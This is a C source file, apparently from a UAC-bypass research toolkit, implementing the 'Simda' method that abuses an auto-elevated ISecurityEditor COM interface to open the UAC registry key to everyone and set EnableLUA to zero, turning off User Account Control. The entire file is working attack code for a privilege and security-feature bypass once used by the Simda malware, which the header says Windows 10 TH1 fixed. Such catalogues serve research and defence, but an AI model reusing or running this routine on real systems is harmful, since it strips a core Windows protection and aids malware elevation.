/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2020
*
*  TITLE:       SIMDA.C
*
*  VERSION:     3.27
*
*  DATE:        10 Sep 2020
*
*  Simda based UAC bypass using ISecurityEditor.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmSimdaTurnOffUac
*
* Purpose:
*
* Disable UAC using AutoElevated undocumented ISecurityEditor interface.
* Used by WinNT/Simda starting from 2010 year.
*
* Fixed in Windows 10 TH1
*
*/
NTSTATUS ucmSimdaTurnOffUac(
    VOID
)
{
    NTSTATUS           MethodResult = STATUS_ACCESS_DENIED;
    HANDLE             hKey = NULL;
    DWORD              dwValue;
    WCHAR              szBuffer[MAX_PATH];
    UNICODE_STRING     ustr;
    OBJECT_ATTRIBUTES  obja;
    UNICODE_STRING     usEnableLua = RTL_CONSTANT_STRING(L"EnableLUA");

    if (ucmMasqueradedSetObjectSecurityCOM(T_UACKEY,
        DACL_SECURITY_INFORMATION, SE_REGISTRY_KEY, T_SDDL_ALL_FOR_EVERYONE))
    {
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, T_REGISTRY_PREP);
        _strcat(szBuffer, T_UACKEY);
        RtlInitUnicodeString(&ustr, szBuffer);
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        MethodResult = NtOpenKey(&hKey, MAXIMUM_ALLOWED, &obja);
        if (NT_SUCCESS(MethodResult)) {

            dwValue = 0;
            MethodResult = NtSetValueKey(
                hKey,
                &usEnableLua,
                0,
                REG_DWORD,
                (PVOID)&dwValue,
                sizeof(DWORD));

            NtClose(hKey);
        }
    }

    if (NT_SUCCESS(MethodResult)) {
        ucmShowMessageById(g_ctx->OutputToDebugger, IDSB_SIMDA_UAC);
    }

    return MethodResult;
}
